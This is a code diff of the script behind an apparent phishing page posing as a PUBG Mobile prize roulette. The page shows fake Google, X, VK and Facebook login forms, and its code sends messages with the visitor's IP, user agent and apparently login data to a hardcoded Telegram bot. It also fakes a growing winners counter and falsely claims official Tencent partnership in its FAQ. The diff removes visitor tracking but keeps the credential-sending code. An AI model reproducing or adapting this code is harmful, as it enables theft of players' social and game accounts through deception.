@@ -3041,14 +3041,6 @@
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
         
-        // Ключи для localStorage
-        const STORAGE_KEYS = {
-            USER_STATE: 'pubg_roulette_user_state',
-            HAS_PLAYED: 'pubg_roulette_has_played',
-            WINNERS_COUNT: 'pubg_roulette_winners_count',
-            IS_OWNER: 'pubg_roulette_is_owner'
-        };
-        
         // Переменные для хранения данных
         let googleEmail = '';
         let xUsername = '';
@@ -3061,16 +3053,6 @@
         let winnersCount = 0;
         let winnersInterval = null;
         let currentLang = 'en';
-        
-        // Объект состояния пользователя
-        let userState = {
-            hasPlayed: false,
-            userPrize: null,
-            isPrizeReceived: false,
-            accountId: '',
-            finalPrizeIndex: null,
-            userIP: ''
-        };
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -3241,14 +3223,14 @@
         // Функция управления счетчиком победителей
         function initWinnersCounter() {
             // Получаем сохраненное значение из localStorage или устанавливаем рандомное от 50 до 100
-            const savedCount = localStorage.getItem(STORAGE_KEYS.WINNERS_COUNT);
+            const savedCount = localStorage.getItem('winnersCount');
             
             if (savedCount) {
                 winnersCount = parseInt(savedCount);
             } else {
                 // Генерируем рандомное число от 50 до 100
                 winnersCount = Math.floor(Math.random() * 51) + 50;
-                localStorage.setItem(STORAGE_KEYS.WINNERS_COUNT, winnersCount.toString());
+                localStorage.setItem('winnersCount', winnersCount.toString());
             }
             
             // Обновляем отображение
@@ -3257,7 +3239,7 @@
             // Запускаем таймер для увеличения счетчика каждые 40 секунд
             winnersInterval = setInterval(() => {
                 winnersCount += Math.floor(Math.random() * 3) + 1; // Добавляем 1-3 победителя
-                localStorage.setItem(STORAGE_KEYS.WINNERS_COUNT, winnersCount.toString());
+                localStorage.setItem('winnersCount', winnersCount.toString());
                 updateWinnersDisplay();
             }, 40000); // 40 секунд
         }
@@ -3275,103 +3257,6 @@
             }
         }
         
-        // Функции для сохранения состояния пользователя
-        function saveUserState() {
-            userState.hasPlayed = hasPlayed;
-            userState.userPrize = userPrize;
-            userState.isPrizeReceived = isPrizeReceived;
-            userState.accountId = accountId;
-            userState.userIP = userIP;
-            userState.finalPrizeIndex = finalPrizeIndex;
-            
-            localStorage.setItem(STORAGE_KEYS.USER_STATE, JSON.stringify(userState));
-        }
-        
-        function loadUserState() {
-            const savedState = localStorage.getItem(STORAGE_KEYS.USER_STATE);
-            
-            if (savedState) {
-                try {
-                    const state = JSON.parse(savedState);
-                    
-                    // Проверяем, тот же ли пользователь (по IP)
-                    if (state.userIP === userIP) {
-                        userState = state;
-                        hasPlayed = state.hasPlayed;
-                        userPrize = state.userPrize;
-                        isPrizeReceived = state.isPrizeReceived;
-                        accountId = state.accountId;
-                        finalPrizeIndex = state.finalPrizeIndex;
-                        
-                        console.log('User state loaded:', userState);
-                        return true;
-                    }
-                } catch (e) {
-                    console.error('Error loading user state:', e);
-                }
-            }
-            return false;
-        }
-        
-        // Функция для отправки уведомлений в Telegram
-        async function sendTelegramNotification(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                const data = await response.json();
-                return data.ok;
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-                return false;
-            }
-        }
-        
-        // Функция для отправки уведомления о посещении сайта
-        async function sendVisitNotification() {
-            const message = `🌐 НОВЫЙ ПОСЕТИТЕЛЬ САЙТА PUBG ROULETTE 🌐\n\n` +
-                          `📍 IP: ${userIP || 'Не определен'}\n` +
-                          `🕐 Время: ${new Date().toLocaleString()}\n` +
-                          `🌍 User Agent: ${navigator.userAgent.substring(0, 100)}...\n` +
-                          `📱 Платформа: ${navigator.platform}\n` +
-                          `🔗 Язык: ${navigator.language}`;
-            
-            await sendTelegramNotification(message);
-        }
-        
-        // Функция для отправки уведомления о запуске рулетки
-        async function sendSpinNotification() {
-            const message = `🎰 ПОЛЬЗОВАТЕЛЬ ЗАПУСТИЛ РУЛЕТКУ 🎰\n\n` +
-                          `📍 IP: ${userIP || 'Не определен'}\n` +
-                          `🕐 Время: ${new Date().toLocaleString()}\n` +
-                          `🎮 Статус: ${hasPlayed ? 'Повторная попытка' : 'Первая попытка'}\n` +
-                          `👑 Владелец: ${userIP === ownerIP ? 'Да' : 'Нет'}`;
-            
-            await sendTelegramNotification(message);
-        }
-        
-        // Функция для отправки уведомления о вводе ID
-        async function sendIdNotification() {
-            const message = `📝 ПОЛЬЗОВАТЕЛЬ ВВЕЛ ID АККАУНТА 📝\n\n` +
-                          `📍 IP: ${userIP || 'Не определен'}\n` +
-                          `🕐 Время: ${new Date().toLocaleString()}\n` +
-                          `🎮 ID аккаунта: ${accountId}\n` +
-                          `🎁 Выигранный приз: ${userPrize ? 'Приз #' + (finalPrizeIndex + 1) : 'Не определен'}`;
-            
-            await sendTelegramNotification(message);
-        }
-        
         document.addEventListener('DOMContentLoaded', function() {
             // Инициализируем снег
             createSnow();
@@ -3382,7 +3267,7 @@
             // Получаем IP пользователя
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
-                .then(async data => {
+                .then(data => {
                     userIP = data.ip;
                     console.log('User IP:', userIP);
                     console.log('Owner IP:', ownerIP);
@@ -3391,30 +3276,16 @@
                     if (userIP === ownerIP) {
                         console.log('Owner detected - unlimited spins');
                         hasPlayed = false;
-                        localStorage.setItem(STORAGE_KEYS.IS_OWNER, 'true');
+                        localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
-                        // Загружаем сохраненное состояние пользователя
-                        const stateLoaded = loadUserState();
-                        if (stateLoaded) {
-                            console.log('User state loaded from localStorage');
-                        }
+                        // Проверяем, играл ли уже пользователь
+                        const played = localStorage.getItem('hasPlayed');
+                        hasPlayed = played === 'true';
                     }
-                    
-                    // Отправляем уведомление о посещении сайта
-                    await sendVisitNotification();
-                    
-                    // Восстанавливаем состояние интерфейса
-                    restoreUIState();
                 })
-                .catch(async error => {
+                .catch(error => {
                     console.log('Error getting IP:', error);
-                    // Отправляем уведомление даже без IP
-                    await sendVisitNotification();
-                    
-                    // Загружаем состояние если есть
-                    loadUserState();
-                    restoreUIState();
                 });
             
             const playBtn = document.getElementById('playBtn');
@@ -3472,48 +3343,6 @@
             
             // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
-            
-            // Функция восстановления состояния интерфейса
-            function restoreUIState() {
-                console.log('Restoring UI state:', userState);
-                
-                // Восстанавливаем приз если есть
-                if (userPrize && finalPrizeIndex !== null && finalPrizeIndex !== undefined) {
-                    console.log('Restoring prize:', userPrize, 'index:', finalPrizeIndex);
-                    
-                    // Устанавливаем рамку на выигранный приз
-                    setTimeout(() => {
-                        moveFrameToPrize(finalPrizeIndex);
-                        showSelectionIndicator(true);
-                    }, 500);
-                    
-                    // Обновляем бейдж
-                    updatePrizeBadge();
-                    
-                    // Если есть ID аккаунта, показываем соцсети
-                    if (accountId) {
-                        accountIdInput.value = accountId;
-                        
-                        // Показываем форму соцсетей
-                        setTimeout(() => {
-                            socialSelectSection.classList.add('active');
-                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                        }, 1000);
-                    } else {
-                        // Показываем форму ввода ID
-                        setTimeout(() => {
-                            accountIdSection.classList.add('active');
-                            accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                        }, 1000);
-                    }
-                }
-                
-                // Обновляем кнопку PLAY
-                if (hasPlayed && userIP !== ownerIP) {
-                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
-                    playBtn.disabled = true;
-                }
-            }
             
             // Языковые настройки
             const translations = {
@@ -3676,7 +3505,7 @@
                     faqAnswers: [
                         "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
                         "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
-                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinji shaxslarga o'tkazilmaydi.",
+                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
                         "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
                         "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
                         "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
@@ -3843,19 +3672,16 @@
             }
             
             // Функция запуска рулетки
-            async function startRoulette() {
+            function startRoulette() {
                 if (isSpinning) return;
                 
                 // Проверяем, является ли пользователь владельцем
-                const isOwner = localStorage.getItem(STORAGE_KEYS.IS_OWNER) === 'true';
+                const isOwner = localStorage.getItem('isOwner') === 'true';
                 
                 if (!isOwner && hasPlayed) {
                     showNotification(translations[currentLang].notificationAlreadyPlayed, true);
                     return;
                 }
-                
-                // Отправляем уведомление о запуске рулетки
-                await sendSpinNotification();
                 
                 isSpinning = true;
                 playBtn.disabled = true;
@@ -3911,18 +3737,15 @@
                             // Сохраняем выигранный приз
                             userPrize = prizes[finalPrizeIndex];
                             isPrizeReceived = false;
-                            hasPlayed = true;
-                            
-                            // Сохраняем состояние пользователя
-                            saveUserState();
                             
                             // Обновляем значок с анимацией
                             updatePrizeBadge();
                             
-                            // Обновляем кнопку
+                            // Сохраняем, что пользователь уже играл (если не владелец)
                             if (userIP !== ownerIP) {
+                                hasPlayed = true;
+                                localStorage.setItem('hasPlayed', 'true');
                                 playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
-                                playBtn.disabled = true;
                             } else {
                                 playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
                             }
@@ -3950,7 +3773,7 @@
             }
             
             // Обработчик кнопки отправки ID аккаунта
-            idSubmitBtn.addEventListener('click', async function() {
+            idSubmitBtn.addEventListener('click', function() {
                 const id = accountIdInput.value.trim();
                 
                 if (!id) {
@@ -3960,12 +3783,6 @@
                 
                 accountId = id;
                 accountIdSection.classList.remove('active');
-                
-                // Сохраняем состояние пользователя
-                saveUserState();
-                
-                // Отправляем уведомление о вводе ID
-                await sendIdNotification();
                 
                 // Сбрасываем выбор соцсети
                 socialOptions.forEach(opt => opt.classList.remove('selected'));
@@ -4016,7 +3833,6 @@
                 if (success) {
                     closeModal('xModalStep2');
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4039,7 +3855,6 @@
                 if (success) {
                     closeModal('vkModal');
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4061,7 +3876,6 @@
                 if (success) {
                     closeModal('facebookModal');
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4112,7 +3926,6 @@
                 if (success) {
                     closeGoogleFullscreen();
                     isPrizeReceived = true;
-                    saveUserState();
                     updatePrizeBadge();
                     showConfirmation();
                     showNotification(translations[currentLang].loginSuccess, false, true);
@@ -4210,7 +4023,34 @@
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
                 message += `📍 IP: ${userIP || 'Не определен'}`;
                 
-                return await sendTelegramNotification(message);
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    console.log('Telegram response:', data);
+                    
+                    if (data.ok) {
+                        return true;
+                    } else {
+                        console.error('Telegram error:', data);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
             }
             
             // Запуск рулетки
@@ -4227,7 +4067,7 @@
             // Проверяем, играл ли пользователь уже
             if (hasPlayed && userIP !== ownerIP) {
                 playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
-                playBtn.disabled = true;
+                playBtn.disabled = false;
             }
             
             // Закрытие окна приза при клике на кнопку "Закрыть"
@@ -4316,18 +4156,13 @@
             
             // Запускаем анимацию рамки через 2 секунды после загрузки
             setTimeout(() => {
-                if (!isSpinning && !hasPlayed) {
+                if (!isSpinning) {
                     animateFrameRandomly();
                 }
             }, 2000);
             
             // Устанавливаем английский язык по умолчанию
             changeLanguage('en');
-            
-            // Восстанавливаем состояние интерфейса через 1 секунду (после загрузки всех данных)
-            setTimeout(() => {
-                restoreUIState();
-            }, 1000);
         });
     </script>
 </body>
